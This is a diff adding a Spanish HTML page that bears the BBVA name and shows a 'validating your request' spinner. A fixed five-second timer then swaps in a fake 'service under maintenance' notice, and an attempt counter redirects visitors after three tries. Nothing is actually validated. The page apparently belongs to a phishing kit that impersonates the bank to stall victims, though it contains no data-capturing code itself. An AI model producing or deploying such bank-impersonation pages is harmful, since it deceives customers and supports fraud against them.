@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mantenimiento</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Playfair+Display:wght@900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="css/estilo.css">
+</head>
+
+<body class="maintenance-body">
+    <main class="maintenance-shell">
+        <section class="maintenance-card" aria-live="polite">
+            <h1 class="logo-text">BBVA</h1>
+
+            <div id="loading-state" class="loading-state">
+                <div class="loader" aria-hidden="true"></div>
+                <h2>Cargando...</h2>
+                <p>Estamos validando la solicitud. Espera un momento.</p>
+            </div>
+
+            <div id="maintenance-state" class="maintenance-state" hidden>
+                <h2>Servicio en mantenimiento</h2>
+                <p>Por el momento la empresa se encuentra en mantenimiento. Vuelva a intentarlo.</p>
+                <button type="button" class="btn-primary" id="retry-button">Volver a intentar</button>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        const MAX_INTENTOS = 3;
+        const intentosActuales = Number(sessionStorage.getItem("intentosMantenimiento") || "0") + 1;
+        sessionStorage.setItem("intentosMantenimiento", String(intentosActuales));
+
+        if (intentosActuales > MAX_INTENTOS) {
+            window.location.href = "intentos_superados.html";
+        }
+
+        const loadingState = document.getElementById("loading-state");
+        const maintenanceState = document.getElementById("maintenance-state");
+        const retryButton = document.getElementById("retry-button");
+
+        setTimeout(function () {
+            loadingState.hidden = true;
+            maintenanceState.hidden = false;
+        }, 5000);
+
+        retryButton.addEventListener("click", function () {
+            window.location.href = "mantenimiento.html";
+        });
+    </script>
+</body>
+
+</html>
